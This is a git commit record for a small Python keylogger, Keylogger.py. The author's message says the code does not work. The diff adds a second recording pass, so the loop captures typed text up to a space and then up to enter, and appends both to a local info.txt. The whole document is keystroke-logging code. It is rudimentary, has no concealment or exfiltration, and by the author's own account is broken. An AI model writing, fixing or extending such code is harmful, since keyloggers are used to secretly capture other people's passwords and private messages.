430ef0964034ff379d1b4aa37cfa69cdd1c00c73
B0ndr3wd <timeo.dubreu@gmail.com>
2026-02-10 21:04:31 +0100

    I dont understand why it doesnt work

--- Keylogger.py
+++ Keylogger.py
@@ -4,7 +4,10 @@ import keyboard
 while True:
     with open('info.txt', 'a') as info: # Create file
         recording = keyboard.record(until='space') #--> When 'space' is enter, stop recording
+        recording2 = keyboard.record(until='enter') #--> When 'enter' is enter, stop recording
         text = list(keyboard.get_typed_strings(recording)) #--> Create a list of all typed text
+        text2 = list(keyboard.get_typed_strings(recording2))
 
         info.write('\n') #--> Go to another line
-        info.write(text[0])
+        info.write(text[0]) #--> print the text in the file
+        info.write(text2[0])
